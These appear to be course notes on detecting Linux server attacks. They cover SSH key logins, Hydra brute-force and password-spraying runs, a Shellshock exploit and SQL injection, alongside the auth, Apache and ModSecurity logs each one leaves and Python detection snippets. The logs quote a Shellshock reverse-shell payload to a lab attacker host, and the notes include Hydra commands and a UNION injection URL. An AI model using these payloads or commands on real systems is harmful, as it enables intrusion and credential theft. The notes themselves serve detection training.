# Module 9: Linux Server Side Attacks

## Credential Abuse

### Suspicious Logins

_Generating an SSH key-pair_

```bash
kali@attacker01:~$ ssh-keygen -t Ed25519
Generating public/private Ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519):
/home/kali/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public-key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:KoewUv5gG6ti0d2zouJ8a9s3C3VjKDIy0tiYqYqd4+A kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|                 |
| B      .        |
|*o*o...oS+       |
|o+o+ooo+o .      |
|+ B o.o o        |
|*B.X.+.+         |
|BEX==.o.o        |
+----[SHA256]-----+
```

_Copying the SSH public-key to the server_

{% code overflow="wrap" %}
```bash
kali@attacker:~$ ssh-copy-id offsec@192.168.51.12
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/kali/.ssh/id_ed25519.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
offsec@192.168.51.12's password:

Number of key(s) added: 1
...
```
{% endcode %}

_Testing public-key SSH authentication_

{% code overflow="wrap" %}
```bash
kali@attacker01:~$ ssh offsec@192.168.51.12 -v
...
debug1: Next authentication method: publickey
debug1: Trying private key: /home/kali/.ssh/id_rsa
debug1: Trying private key: /home/kali/.ssh/id_dsa
debug1: Trying private key: /home/kali/.ssh/id_ecdsa
debug1: Trying private key: /home/kali/.ssh/id_ecdsa_sk
debug1: Offering public-key: /home/kali/.ssh/id_ed25519 ED25519 SHA256:KoewUv5gG6ti0d2zouJ8a9s3C3VjKDIy0tiYqYqd4+A
debug1: Server accepts key: /home/kali/.ssh/id_ed25519 ED25519 SHA256:KoewUv5gG6ti0d2zouJ8a9s3C3VjKDIy0tiYqYqd4+A
debug1: Authentication succeeded (publickey)
Authenticated to 192.168.51.12 ([192.168.51.12]:22).
...
offsec@linux01:~$
```
{% endcode %}

_Verifying SSH server public-key configuration_

```bash
offsec@linux01:~$ sudo cat /etc/ssh/sshd_config | grep Pubkey
...
#PubkeyAuthentication yes
```

_Removing SSH server public-key configuration_

```bash
offsec@linux01:~$ sudo nano  /etc/ssh/sshd_config
...
PubkeyAuthentication no
...
PasswordAuthentication yes
```

Restart the service after making changes.

_Enabling public-key only SSH authentication_

```bash
offsec@linux01:~$ sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication yes
...
PasswordAuthentication no
```

_Inspecting successful public-key authentication_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ sudo tail -f /var/log/auth.log
...
Jul 15 05:48:53 linux01 sshd[1730]: Accepted publickey for offsec from 192.168.51.50 port 55420 ssh2: ED25519 SHA256:DHICqUa5x4uIc9XjbE2fuJRSwS27jpHUAvvClJdmY8c
Jul 15 05:48:53 linux01 sshd[1730]: pam_unix(sshd:session): session opened for user offsec by (uid=0)
```
{% endcode %}

_Increasing SSH server debug verbosity_

```bash
offsec@linux01:~$ sudo nano /etc/ssh/sshd_config
...
#LogLevel INFO
LogLevel DEBUG1
```

_Re-inspecting public-key authentication_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ sudo tail -f /var/log/auth.log
...
Jul 15 07:24:05 linux01 sshd[1879]: Failed publickey for offsec from 192.168.51.50 port 55448 ssh2: ED25519 SHA256:Sx5O7zj6FqY4L4QGGsLgCQT678QjZDw42n4S1CJQc6Q
Jul 15 07:24:05 linux01 sshd[1879]: Connection closed by authenticating user offsec 192.168.51.50 port 55448 [preauth]
...
```
{% endcode %}

### Extra Mile I

An 'invalid user' message is returned when a non-existing user tries to authenticate through SSH. Expand the _ssh\_suspicious\_logons.py_ script to allow extracting this specific failed password event by expanding the 'SCOPE' portion of the script.

### Password Brute Forcing

Password brute forcing is attempting several passwords against a target. _This could be multiple targets._

Password spraying is attempting the same password across several targets. _This could be multiple passwords._

Clearing the authentication logs

```bash
offsec@linux01:~$ sudo truncate /var/log/auth.log --size 0
```

_Performing a traditional brute-force password attack with Hydra_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Linux_Server_Side_Attacks$ hydra -l alice -P ./dict_bf.txt  192.168.51.12 -t 1 ssh
...
```
{% endcode %}

_Inspecting authentication logs after a brute-force attack_

<pre class="language-log" data-overflow="wrap"><code class="lang-log"><strong>offsec@linux01:~$ sudo cat /var/log/auth.log | grep "sshd\["
</strong>Jul 26 07:34:04 linux01 sshd[57354]: Received disconnect from 192.168.51.50 port 55760:11: Bye Bye [preauth]
Jul 26 07:34:04 linux01 sshd[57354]: Disconnected from authenticating user alice 192.168.51.50 port 55760 [preauth]
Jul 26 07:34:04 linux01 sshd[57356]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.51.50  user=alice

Jul 26 07:34:07 linux01 sshd[57356]: Failed password for alice from 192.168.51.50 port 55762 ssh2
Jul 26 07:34:20 linux01 sshd[57356]: message repeated 5 times: [ Failed password for alice from 192.168.51.50 port 55762 ssh2]
Jul 26 07:34:21 linux01 sshd[57356]: error: maximum authentication attempts exceeded for alice from 192.168.51.50 port 55762 ssh2 [preauth]
Jul 26 07:34:21 linux01 sshd[57356]: Disconnecting authenticating user alice 192.168.51.50 port 55762: Too many authentication failures [preauth]
Jul 26 07:34:21 linux01 sshd[57356]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.51.50  user=alice
Jul 26 07:34:21 linux01 sshd[57356]: PAM service(sshd) ignoring max retries; 6 > 3
...
</code></pre>

In this case there is no account lockout threshold; however, it could be configured.

_A warning log about a threshold being reached_

{% code overflow="wrap" %}
```log
...
Disconnecting authenticating user alice 192.168.51.50 port 55762: Too many authentication failures [preauth]
...
```
{% endcode %}

_Launching a successful brute-force attack_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Linux_Server_Side_Attacks$ hydra -l alice -P ./dict_bf_success.txt  192.168.51.12 -t 1 ssh
...
[DATA] max 1 task per 1 server, overall 1 task, 6 login tries (l:1/p:6), ~6 tries per task
[DATA] attacking ssh://192.168.51.12:22/
[22][ssh] host: 192.168.51.12   login: alice   password: lab
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-26 13:53:00
```
{% endcode %}

_Inspecting a successful brute-force attack_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ sudo cat /var/log/auth.log | grep "sshd\["
Jul 26 14:42:36 linux01 sshd[58556]: Received disconnect from 192.168.51.50 port 55914:11: Bye Bye [preauth]
Jul 26 14:42:36 linux01 sshd[58556]: Disconnected from authenticating user alice 192.168.51.50 port 55914 [preauth]
Jul 26 14:42:36 linux01 sshd[58558]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.51.50  user=alice

Jul 26 14:42:38 linux01 sshd[58558]: Failed password for alice from 192.168.51.50 port 55916 ssh2
Jul 26 14:42:41 linux01 sshd[58558]: Failed password for alice from 192.168.51.50 port 55916 ssh2
Jul 26 14:42:49 linux01 sshd[58558]: message repeated 3 times: [ Failed password for alice from 192.168.51.50 port 55916 ssh2]
Jul 26 14:42:50 linux01 sshd[58558]: Accepted password for alice from 192.168.51.50 port 55916 ssh2
Jul 26 14:42:50 linux01 sshd[58558]: pam_unix(sshd:session): session opened for user alice by (uid=0)
...
```
{% endcode %}

{% hint style="info" %}
Password spraying is often more effective than expected as password reuse among multiple accounts is not that uncommon.
{% endhint %}

_Launching a successful password-spraying attack_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Linux_Server_Side_Attacks$ hydra -L users.txt -P ./dict_bf_success.txt  192.168.51.12 -t 1 ssh -u
...
[DATA] attacking ssh://192.168.51.12:22/
[22][ssh] host: 192.168.51.12   login: bob   password: lab
[22][ssh] host: 192.168.51.12   login: alice   password: lab
[22][ssh] host: 192.168.51.12   login: wendy   password: lab
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-27 04:32:31
```
{% endcode %}

_Inspecting password-spraying log_

{% code overflow="wrap" %}
```log
offsec@linux01:~/SOC-200/Linux_Server_Side_Attacks$ sudo cat /var/log/auth.log | grep "sshd\["
Jul 27 04:40:59 linux01 sshd[60703]: Received disconnect from 192.168.51.50 port 55960:11: Bye Bye [preauth]
Jul 27 04:40:59 linux01 sshd[60703]: Disconnected from authenticating user bob 192.168.51.50 port 55960 [preauth]

Jul 27 04:40:59 linux01 sshd[60705]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.51.50  user=bob
...
Jul 27 04:41:42 linux01 sshd[60736]: Failed password for wendy from 192.168.51.50 port 55990 ssh2
Jul 27 04:41:44 linux01 sshd[60736]: Received disconnect from 192.168.51.50 port 55990:11: Bye Bye [preauth]
Jul 27 04:41:44 linux01 sshd[60736]: Disconnected from authenticating user wendy 192.168.51.50 port 55990 [preauth]
Jul 27 04:41:44 linux01 sshd[60738]: Accepted password for bob from 192.168.51.50 port 55992 ssh2
Jul 27 04:41:44 linux01 sshd[60738]: pam_unix(sshd:session): session opened for user bob by (uid=0)
Jul 27 04:41:44 linux01 sshd[60740]: Accepted password for alice from 192.168.51.50 port 55994 ssh2
Jul 27 04:41:44 linux01 sshd[60740]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Jul 27 04:41:44 linux01 sshd[60750]: Accepted password for wendy from 192.168.51.50 port 55996 ssh2
Jul 27 04:41:44 linux01 sshd[60750]: pam_unix(sshd:session): session opened for user wendy by (uid=0)
Jul 27 04:41:47 linux01 sshd[61044]: Received disconnect from 192.168.51.50 port 55992:11: Bye Bye
Jul 27 04:41:47 linux01 sshd[61044]: Disconnected from user bob 192.168.51.50 port 55992
Jul 27 04:41:47 linux01 sshd[60738]: pam_unix(sshd:session): session closed for user bob
Jul 27 04:41:47 linux01 sshd[61104]: Received disconnect from 192.168.51.50 port 55994:11: Bye Bye
Jul 27 04:41:47 linux01 sshd[61104]: Disconnected from user alice 192.168.51.50 port 55994
Jul 27 04:41:47 linux01 sshd[60740]: pam_unix(sshd:session): session closed for user alice
Jul 27 04:41:47 linux01 sshd[60750]: pam_unix(sshd:session): session closed for user wendy
```
{% endcode %}

_Filtering password-spraying logs through script_

{% code overflow="wrap" %}
```bash
offsec@linux01:~/SOC-200/Linux_Server_Side_Attacks$ python3 ssh_suspicious_logons.py password all off

Jul 27 04:41:01 Failed password  bob  192.168.51.50
Jul 27 04:41:04 Failed password  alice  192.168.51.50
Jul 27 04:41:07 Failed password  wendy  192.168.51.50
Jul 27 04:41:11 Failed password  bob  192.168.51.50
Jul 27 04:41:14 Failed password  alice  192.168.51.50
Jul 27 04:41:16 Failed password  wendy  192.168.51.50
Jul 27 04:41:20 Failed password  bob  192.168.51.50
Jul 27 04:41:23 Failed password  alice  192.168.51.50
Jul 27 04:41:26 Failed password  wendy  192.168.51.50
Jul 27 04:41:29 Failed password  bob  192.168.51.50
Jul 27 04:41:32 Failed password  alice  192.168.51.50
Jul 27 04:41:34 Failed password  wendy  192.168.51.50
Jul 27 04:41:37 Failed password  bob  192.168.51.50
Jul 27 04:41:39 Failed password  alice  192.168.51.50
Jul 27 04:41:42 Failed password  wendy  192.168.51.50
Jul 27 04:41:44 Accepted password  bob  192.168.51.50
Jul 27 04:41:44 Accepted password  alice  192.168.51.50
Jul 27 04:41:44 Accepted password  wendy  192.168.51.50
```
{% endcode %}

### Extra Mile II

Expand the _ssh\_suspicious\_logons.py_ script to give a warning if password failure attempts are equal to or greater than three within 60 seconds. Hint: Use timestamps as a reference.

## Web Application Attacks

### Command Injection

_Launching the Shellshock attack_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Linux_Server_Side_Attacks$ ./shellshock.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[*] 404 on : /cgi-bin/test.cgi
[-] Trying exploit on : /cgi-bin-sdb/printenv
[*] 404 on : /cgi-bin-sdb/printenv
[-] Trying exploit on : /cgi-bin/192.168.51
[!] Successfully exploited
[!] Incoming connection from 192.168.51.12
192.168.51.12>
```
{% endcode %}

_Inspecting the logs after a successful Shellshock attack_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ cat /var/log/apache2/access.log
192.168.51.50 - - [02/Aug/2021:03:59:03 -0400] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 436 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
192.168.51.50 - - [02/Aug/2021:03:59:04 -0400] "GET /cgi-mod/index.cgi HTTP/1.1" 404 436 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
192.168.51.50 - - [02/Aug/2021:03:59:05 -0400] "GET /cgi-bin/test.cgi HTTP/1.1" 404 436 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
192.168.51.50 - - [02/Aug/2021:03:59:06 -0400] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 436 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
192.168.51.50 - - [02/Aug/2021:03:57:11 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 151 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
```
{% endcode %}

_Investigating system processes to spot anomalies_

```bash
offsec@linux01:~$ sudo ps aux | grep "/bin/bash"
www-data   26016  0.0  0.1   3612  2760 ?        S    05:12   0:00 /bin/bash
...
```

_Adding Shellshock regex to our log parser_

```python
shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
```

_Verifying if the Shellshock attack succeeded or not_

{% code overflow="wrap" %}
```python
for match in re.finditer(web_log_regex, line, re.S):
                        log_line = (re.match(web_log_regex, line)).groups()
                        print("checking Shellshock")
                        for match in re.finditer(shellshock_regex, log_line[5], re.S):
                            if log_line[3] != '200':
                                print("[!] - Shellshock attempt DETECTED!")
                            elif log_line[3] == '200':
                                print("[!] - Shellshock attack SUCCEEDED")
                                print(log_line)
```
{% endcode %}

{% hint style="info" %}
Vulnerability scanners and penetration testers might trigger exploit-specific alerts similar to the one we just analyzed. However, in a real world investigation, the next step should be to verify that the affected component is actually vulnerable to the exploit trails left in the logs. In our sample case, we should further verify whether or not the Bash version is vulnerable to Shellshock.
{% endhint %}

_Detecting the Shellshock attempts with our script_

{% code overflow="wrap" %}
```bash
offsec@linux01:~/SOC-200/Linux_Server_Side_Attacks$ python3 shellshock_log_detector.py
[!] - Shellshock attempt DETECTED in /var/log/apache2/access.log
[!] - Shellshock attempt DETECTED in /var/log/apache2/access.log
[!] - Shellshock attempt DETECTED in /var/log/apache2/access.log
[!] - Shellshock attempt DETECTED in /var/log/apache2/access.log
[!] - Shellshock attack  SUCCEEDED in /var/log/apache2/access.log
('192.168.51.50', '02/Aug/2021:06:20:18 -0400', 'GET /cgi-bin/index.cgi HTTP/1.1', '200', '151', '() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &', '-')
```
{% endcode %}

Previously shown snippets had the payload in the Referer header, though it could also be in the Cookie header if the web server processes it and triggers the vulnerability. This is important because default Apache logging behavior doesn't save any information about the Cookie HTTP header.

_Example logs with Shellshock payload in Cookie_

{% code overflow="wrap" %}
```log
offsec@linux01:~/SOC-200/Linux_Server_Side_Attacks$ sudo cat /var/log/apache2/access.log
192.168.51.50 - - [02/Aug/2021:07:07:31 -0400] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 436 "-" "-"
192.168.51.50 - - [02/Aug/2021:07:07:32 -0400] "GET /cgi-mod/index.cgi HTTP/1.1" 404 436 "-" "-"
192.168.51.50 - - [02/Aug/2021:07:07:33 -0400] "GET /cgi-bin/test.cgi HTTP/1.1" 404 436 "-" "-"
192.168.51.50 - - [02/Aug/2021:07:07:34 -0400] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 436 "-" "-"
192.168.51.50 - - [02/Aug/2021:07:07:35 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 151 "-" "-"
```
{% endcode %}

_Adding Cookie HTTP header logging to the Apache config file_

{% code overflow="wrap" %}
```bash
offsec@linux01:~$ cat /etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
...
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

 	LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{Cookie}i\" with_cookies
	CustomLog /var/log/apache2/with_cookies.log with_cookies
	
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
{% endcode %}

_Reviewing logs with Cookie included_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ cat /var/log/apache2/with_cookies.log
192.168.51.50 - - [02/Aug/2021:07:57:02 -0400] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 275 "-" "-" "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &"
192.168.51.50 - - [02/Aug/2021:07:57:03 -0400] "GET /cgi-mod/index.cgi HTTP/1.1" 404 275 "-" "-" "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &"
192.168.51.50 - - [02/Aug/2021:07:57:04 -0400] "GET /cgi-bin/test.cgi HTTP/1.1" 404 275 "-" "-" "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &"
192.168.51.50 - - [02/Aug/2021:07:57:05 -0400] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 275 "-" "-" "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &"
192.168.51.50 - - [02/Aug/2021:07:57:06 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 18 "-" "-" "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1 &"
```
{% endcode %}

### Extra Mile II

Write a unified version of _shellshock\_log\_detector.py_ and _shellshock\_log\_detector\_cookies.py_ in a single Python script so that it can be reused for both the original shellshock attack, as well as the cookie-based stealthy modification.

### SQL Injection

_Normal online clothing shop color selection_

```uri
https://megacorpone.local/tshirts?color=purple
```

_The above query may look like this on the SQL database end_

```sql
SELECT * FROM tshirts WHERE color = $color;  
```

_UNION based SQL injection_

{% code overflow="wrap" %}
```uri
https://megacorpone.local/tshirts?color=purple'+UNION+SELECT+username+passwords+FROM+administrators--
```
{% endcode %}

_The above query may now look like this on the SQL database end_

{% code overflow="wrap" %}
```sql
SELECT * FROM tshirt WHERE color = 'purple' UNION SELECT username, passwords FROM administrators;
```
{% endcode %}

_Inspecting Apache access log after sqlmap ran against the server_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ cat /var/log/apache2/access.log
192.168.50.50 - - [06/Aug/2021:09:34:45 -0400] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 77 "-" "sqlmap/1.5.7#stable (http://sqlmap.org)"
192.168.50.50 - - [06/Aug/2021:09:34:45 -0400] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 77 "-" "sqlmap/1.5.7#stable (http://sqlmap.org)"
192.168.50.50 - - [06/Aug/2021:09:34:46 -0400] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 77 "-" "sqlmap/1.5.7#stable (http://sqlmap.org)"
```
{% endcode %}

Nothing useful here really, other than seeing the sqlmap user-agent. In the lab provided, ModSecurity is preconfigured. ModSecurity offers detection and prevention capabilities against several web application attack vectors and provides increased logging to help with investigations.

_Filtering out POST requests from teh ModSec log file_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ sudo cat /var/log/apache2/modsec_audit.log | awk '/-A--/,/-F--/'
...
--d6eb6105-B--
POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Length: 127
Cache-Control: no-cache
User-Agent: sqlmap/1.5.7#stable (http://sqlmap.org)
Host: 192.168.50.12:8080
Accept: */*
Accept-Encoding: gzip,deflate
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

--d6eb6105-C--
action=spAjaxResults&pollid=2%27%29%20AND%201199%3D%28SELECT%201199%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27RdCO%27%3D%27RdCO
--d6eb6105-F--
HTTP/1.1 403 Forbidden
Content-Length: 280
Connection: close
Content-Type: text/html; charset=iso-8859-1
...
```
{% endcode %}

* _-A--_ (audit log header)
* _-F--_ (response header)

_ModSecurity explicitly warning about the SQL injection attack_

{% code overflow="wrap" %}
```log
offsec@linux01:~$ sudo cat /var/log/apache2/modsec_audit.log | grep 'detected SQLi'
...
Message: Warning. detected SQLi using libinjection with fingerprint '1)&(1' [file "/usr/share/modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "67"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: 1)&(1 found within ARGS:pollid: 2) AND 4728=8659 AND (4778=4778"] [severity "CRITICAL"] [ver "OWASP_CRS/3.2.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] [tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"]
```
{% endcode %}

### Extra Mile IV

Similar to what we did earlier in the Topic, write a Python script that will parse the ModSec generated log file and find all of the SQL injection warnings related to the vulnerable _pollid_ argument.
